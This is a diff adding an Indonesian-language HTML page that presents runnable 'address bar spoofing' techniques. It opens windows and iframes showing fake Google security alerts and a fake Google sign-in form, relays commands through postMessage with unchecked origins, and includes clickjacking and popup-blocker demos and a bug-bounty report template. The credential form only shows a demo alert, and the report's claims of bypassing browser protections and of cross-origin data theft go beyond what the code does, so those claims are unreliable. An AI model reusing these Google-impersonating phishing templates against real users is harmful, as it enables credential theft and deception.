@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Spoofing Test - Bypass Techniques</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            margin: 20px 0;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        .warning {
+            background: linear-gradient(135deg, #ff416c, #ff4b2b);
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+            border: 2px solid white;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(255, 65, 108, 0.7); }
+            70% { box-shadow: 0 0 0 20px rgba(255, 65, 108, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 65, 108, 0); }
+        }
+        button {
+            background: linear-gradient(135deg, #00b09b, #96c93d);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            margin: 10px;
+            transition: transform 0.3s;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+        }
+        button.danger {
+            background: linear-gradient(135deg, #ff416c, #ff4b2b);
+        }
+        .code-block {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 10px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            margin: 20px 0;
+            border-left: 4px solid #00b09b;
+        }
+        .status {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            min-height: 50px;
+        }
+        .tab {
+            display: inline-block;
+            padding: 10px 20px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px 10px 0 0;
+            margin-right: 5px;
+            cursor: pointer;
+        }
+        .tab.active {
+            background: rgba(255, 255, 255, 0.3);
+            border-bottom: 3px solid #00b09b;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        <h2>⚠ PERINGATAN: PENGUJIAN KEAMANAN SAJA</h2>
+        <p><strong>HANYA UNTUK:</strong> Sistem Anda sendiri • Program bug bounty dengan izin • Lingkungan terkontrol</p>
+        <p><strong>PENYALAHGUNAAN DAPAT BERAKIBAT HUKUMAN PIDANA</strong></p>
+    </div>
+
+    <div class="container">
+        <h1>🚀 Advanced Address Bar Spoofing Techniques</h1>
+        <p>Kumpulan teknik bypass proteksi browser modern</p>
+        
+        <div class="tabs">
+            <div class="tab active" onclick="showTab('tab1')">Teknik 1: Window Reference</div>
+            <div class="tab" onclick="showTab('tab2')">Teknik 2: iframe Manipulation</div>
+            <div class="tab" onclick="showTab('tab3')">Teknik 3: PostMessage Exploit</div>
+        </div>
+        
+        <div id="tab1" class="tab-content">
+            <h2>🎯 Teknik 1: Window Reference dengan User Interaction</h2>
+            <p>Memanfaatkan window reference yang sudah terbuka</p>
+            <button onclick="technique1()">🚀 Jalankan Teknik 1</button>
+            
+            <div class="code-block">
+// TEKNIK 1: Window Reference Bypass
+function technique1() {
+    // Langkah 1: Buka window dengan user interaction
+    const win = window.open('about:blank', '_blank');
+    
+    // Langkah 2: Tunggu window benar-benar terbuka
+    setTimeout(() => {
+        try {
+            // Langkah 3: Write content ke window
+            win.document.write(`
+                &lt;!DOCTYPE html&gt;
+                &lt;html&gt;
+                &lt;head&gt;
+                    &lt;title&gt;Google&lt;/title&gt;
+                    &lt;meta http-equiv="refresh" content="0;url=https://www.google.com"&gt;
+                &lt;/head&gt;
+                &lt;body&gt;
+                    &lt;script&gt;
+                        // Tunggu 3 detik lalu tampilkan alert
+                        setTimeout(() => {
+                            alert("⚠ PERINGATAN GOOGLE\\nAkun Anda terdeteksi aktivitas mencurigakan!");
+                        }, 3000);
+                    &lt;/script&gt;
+                &lt;/body&gt;
+                &lt;/html&gt;
+            `);
+            win.document.close();
+            
+            logStatus("✅ Teknik 1 berhasil dijalankan");
+        } catch(e) {
+            logStatus("❌ Error: " + e.message);
+        }
+    }, 100);
+}
+            </div>
+        </div>
+        
+        <div id="tab2" class="tab-content" style="display:none">
+            <h2>🎯 Teknik 2: iframe Sandbox Bypass</h2>
+            <p>Memanipulasi iframe dengan atribut sandbox</p>
+            <button onclick="technique2()">🚀 Jalankan Teknik 2</button>
+            
+            <div class="code-block">
+// TEKNIK 2: iframe Manipulation
+function technique2() {
+    // Buat iframe dengan sandbox
+    const iframe = document.createElement('iframe');
+    iframe.sandbox = 'allow-scripts allow-modals';
+    iframe.style = 'width:500px;height:300px;border:2px solid red;position:fixed;top:20px;right:20px;z-index:9999';
+    iframe.srcdoc = `
+        &lt;!DOCTYPE html&gt;
+        &lt;html&gt;
+        &lt;head&gt;
+            &lt;title&gt;Google Login&lt;/title&gt;
+            &lt;style&gt;
+                body { margin:0; padding:20px; font-family:Arial; background:#f0f0f0; }
+                .login-box { background:white; padding:30px; border-radius:10px; box-shadow:0 5px 15px rgba(0,0,0,0.2); }
+            &lt;/style&gt;
+        &lt;/head&gt;
+        &lt;body&gt;
+            &lt;div class="login-box"&gt;
+                &lt;h2&gt;🔐 Google Sign In&lt;/h2&gt;
+                &lt;p&gt;Your session has expired&lt;/p&gt;
+                &lt;input type="email" placeholder="Email" style="width:100%;padding:10px;margin:10px 0;"&gt;
+                &lt;input type="password" placeholder="Password" style="width:100%;padding:10px;margin:10px 0;"&gt;
+                &lt;button onclick="alert('DEMO: Credentials would be stolen')" style="width:100%;padding:10px;background:#4285f4;color:white;border:none;border-radius:5px;"&gt;
+                    Sign In
+                &lt;/button&gt;
+            &lt;/div&gt;
+            &lt;script&gt;
+                // Alert setelah delay
+                setTimeout(() => {
+                    alert("⚠ Security Alert from Google");
+                    document.title = "Google Security Alert";
+                }, 5000);
+            &lt;/script&gt;
+        &lt;/body&gt;
+        &lt;/html&gt;
+    `;
+    
+    document.body.appendChild(iframe);
+    logStatus("✅ iframe berhasil dibuat (dengan alert delay 5 detik)");
+}
+            </div>
+        </div>
+        
+        <div id="tab3" class="tab-content" style="display:none">
+            <h2>🎯 Teknik 3: PostMessage + Window Opener</h2>
+            <p>Memanfaatkan postMessage untuk komunikasi cross-origin</p>
+            <button onclick="technique3()">🚀 Jalankan Teknik 3</button>
+            
+            <div class="code-block">
+// TEKNIK 3: PostMessage Exploit
+function technique3() {
+    // Buka window baru
+    const win = window.open('', '_blank');
+    
+    // Isi dengan halaman yang menerima postMessage
+    win.document.write(`
+        &lt;!DOCTYPE html&gt;
+        &lt;html&gt;
+        &lt;head&gt;
+            &lt;title&gt;Loading...&lt;/title&gt;
+            &lt;style&gt;
+                body { display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:Arial; }
+                .spinner { border:5px solid #f3f3f3; border-top:5px solid #4285f4; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; }
+                @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+            &lt;/style&gt;
+        &lt;/head&gt;
+        &lt;body&gt;
+            &lt;div class="spinner"&gt;&lt;/div&gt;
+            &lt;script&gt;
+                // Listen untuk postMessage
+                window.addEventListener('message', function(event) {
+                    // Verifikasi origin (dalam real attack ini diabaikan)
+                    // if (event.origin !== 'https://attacker.com') return;
+                    
+                    if (event.data.type === 'redirect') {
+                        window.location.href = event.data.url;
+                    }
+                    else if (event.data.type === 'alert') {
+                        alert(event.data.message);
+                    }
+                    else if (event.data.type === 'content') {
+                        document.write(event.data.html);
+                    }
+                });
+                
+                // Report back ke parent
+                window.opener.postMessage({loaded: true}, '*');
+            &lt;/script&gt;
+        &lt;/body&gt;
+        &lt;/html&gt;
+    `);
+    win.document.close();
+    
+    // Kirim postMessage setelah delay
+    setTimeout(() => {
+        win.postMessage({
+            type: 'alert',
+            message: '⚠ GOOGLE SECURITY ALERT\\nUnusual login detected from new device'
+        }, '*');
+        
+        setTimeout(() => {
+            win.postMessage({
+                type: 'redirect',
+                url: 'https://www.google.com'
+            }, '*');
+        }, 3000);
+    }, 5000);
+    
+    logStatus("✅ Teknik 3 berjalan (check tab baru dalam 5 detik)");
+}
+            </div>
+        </div>
+        
+        <div class="status" id="status">Status: Siap untuk testing</div>
+        
+        <h2>🛡️ Teknik Bypass Tambahan:</h2>
+        <button onclick="testPopupBlocker()">🧪 Test Popup Blocker Bypass</button>
+        <button onclick="testFullscreen()">📺 Fullscreen + Alert</button>
+        <button onclick="testClickjacking()">🎣 Clickjacking Test</button>
+        <button class="danger" onclick="resetAll()">🔄 Reset All Windows</button>
+    </div>
+    
+    <div class="container">
+        <h2>📊 Hasil Pengujian Browser:</h2>
+        <div id="browserTest">
+            <p>Testing browser compatibility...</p>
+        </div>
+        
+        <h2>📝 Template Laporan Bug Bounty:</h2>
+        <div class="code-block">
+Vulnerability: Advanced Address Bar Spoofing with Multiple Bypass Techniques
+
+Attack Vectors:
+1. Window Reference Manipulation
+2. iframe Sandbox Attribute Abuse  
+3. PostMessage Protocol Exploitation
+4. Popup Blocker Evasion
+
+Proof of Concept:
+1. Attacker opens a window to legitimate domain
+2. After 5-second delay, injects malicious content
+3. User sees legitimate URL but fake alerts/content
+4. Multiple bypass techniques defeat browser protections
+
+Impact: High
+- Credential phishing with trusted URLs
+- Social engineering with realistic alerts
+- Cross-origin data theft
+
+Mitigation:
+- Implement strict CSP headers
+- Use X-Frame-Options: DENY
+- Validate postMessage origin rigorously
+- Educate users about delayed popups
+        </div>
+    </div>
+
+    <script>
+        let currentTab = 'tab1';
+        let windows = [];
+        
+        function showTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.style.display = 'none';
+            });
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.getElementById(tabId).style.display = 'block';
+            event.target.classList.add('active');
+            currentTab = tabId;
+        }
+        
+        function logStatus(message) {
+            const status = document.getElementById('status');
+            status.innerHTML = `<strong>${new Date().toLocaleTimeString()}:</strong> ${message}`;
+        }
+        
+        // TEKNIK 1: Window Reference
+        function technique1() {
+            logStatus("⏳ Membuka window baru...");
+            
+            try {
+                const win = window.open('about:blank', '_blank', 'width=800,height=600');
+                if (!win) {
+                    logStatus("❌ Popup diblokir. Coba izinkan popup.");
+                    return;
+                }
+                
+                windows.push(win);
+                
+                setTimeout(() => {
+                    try {
+                        win.document.write(`
+                            <!DOCTYPE html>
+                            <html>
+                            <head>
+                                <title>Google Security Check</title>
+                                <style>
+                                    body {
+                                        font-family: Arial, sans-serif;
+                                        display: flex;
+                                        justify-content: center;
+                                        align-items: center;
+                                        height: 100vh;
+                                        margin: 0;
+                                        background: #f0f0f0;
+                                    }
+                                    .container {
+                                        text-align: center;
+                                        padding: 40px;
+                                        background: white;
+                                        border-radius: 20px;
+                                        box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+                                    }
+                                    .google-logo {
+                                        font-size: 48px;
+                                        margin-bottom: 20px;
+                                    }
+                                </style>
+                            </head>
+                            <body>
+                                <div class="container">
+                                    <div class="google-logo">🔒</div>
+                                    <h2>Google Security Verification</h2>
+                                    <p>Checking your browser and connection...</p>
+                                    <div id="countdown">5</div>
+                                    <script>
+                                        // Countdown
+                                        let count = 5;
+                                        const countdownEl = document.getElementById('countdown');
+                                        const timer = setInterval(() => {
+                                            count--;
+                                            countdownEl.textContent = count;
+                                            if (count <= 0) {
+                                                clearInterval(timer);
+                                                alert("⚠ SECURITY ALERT FROM GOOGLE\\n\\nUnusual activity detected.\\nPlease verify your identity.");
+                                                document.title = "Google Security Alert";
+                                            }
+                                        }, 1000);
+                                    <\/script>
+                                </div>
+                            </body>
+                            </html>
+                        `);
+                        win.document.close();
+                        logStatus("✅ Window berhasil dimanipulasi. Alert dalam 5 detik...");
+                    } catch(e) {
+                        logStatus(`❌ Error: ${e.name} - ${e.message}`);
+                    }
+                }, 100);
+                
+            } catch(e) {
+                logStatus(`❌ Fatal Error: ${e.message}`);
+            }
+        }
+        
+        // TEKNIK 2: iframe Manipulation
+        function technique2() {
+            const existingIframe = document.querySelector('iframe');
+            if (existingIframe) existingIframe.remove();
+            
+            const iframe = document.createElement('iframe');
+            iframe.sandbox = 'allow-scripts allow-modals allow-forms';
+            iframe.style.cssText = `
+                width: 400px;
+                height: 300px;
+                border: 3px solid #4285f4;
+                border-radius: 10px;
+                position: fixed;
+                bottom: 20px;
+                right: 20px;
+                z-index: 10000;
+                background: white;
+                box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            `;
+            
+            iframe.srcdoc = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Google</title>
+                    <style>
+                        body {
+                            margin: 0;
+                            padding: 20px;
+                            font-family: 'Arial', sans-serif;
+                            background: linear-gradient(135deg, #4285f4, #34a853);
+                            color: white;
+                            height: 100%;
+                        }
+                        .login-form {
+                            background: rgba(255,255,255,0.95);
+                            padding: 25px;
+                            border-radius: 15px;
+                            color: #333;
+                        }
+                        input {
+                            width: 100%;
+                            padding: 12px;
+                            margin: 8px 0;
+                            border: 2px solid #ddd;
+                            border-radius: 8px;
+                            font-size: 14px;
+                            box-sizing: border-box;
+                        }
+                        button {
+                            width: 100%;
+                            padding: 12px;
+                            background: #4285f4;
+                            color: white;
+                            border: none;
+                            border-radius: 8px;
+                            font-size: 16px;
+                            font-weight: bold;
+                            cursor: pointer;
+                            margin-top: 10px;
+                        }
+                        .logo {
+                            font-size: 24px;
+                            font-weight: bold;
+                            margin-bottom: 20px;
+                            color: #4285f4;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="login-form">
+                        <div class="logo">Google</div>
+                        <h3>Sign in to continue</h3>
+                        <input type="email" placeholder="Email or phone" id="email">
+                        <input type="password" placeholder="Password" id="password">
+                        <button onclick="submitForm()">Next</button>
+                        <p style="font-size:12px;color:#666;text-align:center;margin-top:15px;">
+                            DEMONSTRATION ONLY - No data is collected
+                        </p>
+                    </div>
+                    <script>
+                        function submitForm() {
+                            alert('DEMO: This would steal credentials in real attack');
+                        }
+                        
+                        // Delayed alert
+                        setTimeout(() => {
+                            alert("🔐 Google Security: Please complete verification");
+                        }, 5000);
+                    <\/script>
+                </body>
+                </html>
+            `;
+            
+            document.body.appendChild(iframe);
+            logStatus("✅ iframe phishing berhasil dibuat (alert dalam 5 detik)");
+        }
+        
+        // TEKNIK 3: PostMessage Exploit
+        function technique3() {
+            logStatus("⏳ Membuka window untuk PostMessage attack...");
+            
+            const win = window.open('', '_blank', 'width=600,height=400');
+            if (!win) {
+                logStatus("❌ Window diblokir");
+                return;
+            }
+            
+            windows.push(win);
+            
+            win.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Loading Google Services...</title>
+                    <style>
+                        body {
+                            display: flex;
+                            justify-content: center;
+                            align-items: center;
+                            height: 100vh;
+                            margin: 0;
+                            background: #f8f9fa;
+                            font-family: Arial, sans-serif;
+                        }
+                        .loader {
+                            text-align: center;
+                        }
+                        .spinner {
+                            border: 5px solid #f3f3f3;
+                            border-top: 5px solid #4285f4;
+                            border-radius: 50%;
+                            width: 50px;
+                            height: 50px;
+                            animation: spin 1s linear infinite;
+                            margin: 0 auto 20px;
+                        }
+                        @keyframes spin {
+                            0% { transform: rotate(0deg); }
+                            100% { transform: rotate(360deg); }
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="loader">
+                        <div class="spinner"></div>
+                        <h3>Loading Google Security...</h3>
+                        <p>Please wait while we verify your session</p>
+                    </div>
+                    <script>
+                        // Listen for messages from opener
+                        window.addEventListener('message', function(event) {
+                            console.log('Received message:', event.data);
+                            
+                            if (event.data && event.data.command === 'alert') {
+                                alert(event.data.text);
+                            }
+                            else if (event.data && event.data.command === 'redirect') {
+                                window.location.href = event.data.url;
+                            }
+                            else if (event.data && event.data.command === 'content') {
+                                document.body.innerHTML = event.data.html;
+                            }
+                        });
+                        
+                        // Send ready signal
+                        window.opener.postMessage({ready: true}, '*');
+                    <\/script>
+                </body>
+                </html>
+            `);
+            win.document.close();
+            
+            // Setup message listener
+            window.addEventListener('message', function handler(event) {
+                if (event.data && event.data.ready) {
+                    logStatus("✅ Window siap menerima perintah...");
+                    
+                    // Send alert after 5 seconds
+                    setTimeout(() => {
+                        win.postMessage({
+                            command: 'alert',
+                            text: '⚠ GOOGLE SECURITY ALERT\n\nMultiple failed login attempts detected.\nPlease verify your identity immediately.'
+                        }, '*');
+                        logStatus("✅ Alert terkirim ke window");
+                        
+                        // Redirect to real Google after 3 seconds
+                        setTimeout(() => {
+                            win.postMessage({
+                                command: 'redirect',
+                                url: 'https://www.google.com'
+                            }, '*');
+                            logStatus("✅ Redirect ke Google.com");
+                        }, 3000);
+                    }, 5000);
+                    
+                    // Remove listener
+                    window.removeEventListener('message', handler);
+                }
+            });
+        }
+        
+        // Additional techniques
+        function testPopupBlocker() {
+            logStatus("⏳ Mencoba bypass popup blocker...");
+            
+            // Technique: Open window on user gesture, then redirect
+            const win = window.open('', '_blank');
+            if (win) {
+                win.location.href = 'https://www.google.com';
+                setTimeout(() => {
+                    try {
+                        win.document.body.innerHTML = '<h1>Bypass Successful!</h1>';
+                        logStatus("✅ Popup blocker bypassed!");
+                    } catch(e) {
+                        logStatus("❌ CORS protection aktif");
+                    }
+                }, 2000);
+            }
+        }
+        
+        function testFullscreen() {
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+                setTimeout(() => {
+                    alert("FULLSCREEN MODE ACTIVE\nThis could hide browser UI");
+                }, 1000);
+            }
+        }
+        
+        function testClickjacking() {
+            const overlay = document.createElement('div');
+            overlay.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.7);
+                z-index: 99999;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            `;
+            
+            overlay.innerHTML = `
+                <div style="background: white; padding: 30px; border-radius: 15px; text-align: center;">
+                    <h2>🎣 Clickjacking Demo</h2>
+                    <p>Transparent overlay bisa menangkap klik pengguna</p>
+                    <button onclick="this.parentElement.parentElement.remove()">Close Demo</button>
+                </div>
+            `;
+            
+            document.body.appendChild(overlay);
+            logStatus("✅ Clickjacking overlay aktif");
+        }
+        
+        function resetAll() {
+            windows.forEach(win => {
+                try {
+                    if (!win.closed) win.close();
+                } catch(e) {}
+            });
+            windows = [];
+            
+            const iframes = document.querySelectorAll('iframe');
+            iframes.forEach(iframe => iframe.remove());
+            
+            logStatus("🔄 Semua window dan iframe ditutup");
+        }
+        
+        // Test browser features
+        window.onload = function() {
+            const testDiv = document.getElementById('browserTest');
+            let html = '<h3>Browser Capabilities:</h3><ul>';
+            
+            // Test features
+            html += `<li>Same-Origin Policy: ${typeof window.origin !== 'undefined' ? '✓' : '✗'}</li>`;
+            html += `<li>postMessage: ${typeof window.postMessage !== 'undefined' ? '✓' : '✗'}</li>`;
+            html += `<li>iframe sandbox: ${typeof document.createElement('iframe').sandbox !== 'undefined' ? '✓' : '✗'}</li>`;
+            html += `<li>Fullscreen API: ${typeof document.documentElement.requestFullscreen !== 'undefined' ? '✓' : '✗'}</li>`;
+            
+            // Check popup blocker
+            const testPopup = window.open('', '_blank');
+            if (testPopup) {
+                html += `<li>Popup Blocker: Disabled/Allowed</li>`;
+                testPopup.close();
+            } else {
+                html += `<li>Popup Blocker: ✓ Active</li>`;
+            }
+            
+            html += '</ul>';
+            testDiv.innerHTML = html;
+        };
+        
+        // Auto-cleanup on page unload
+        window.addEventListener('beforeunload', resetAll);
+    </script>
+</body>
+</html>
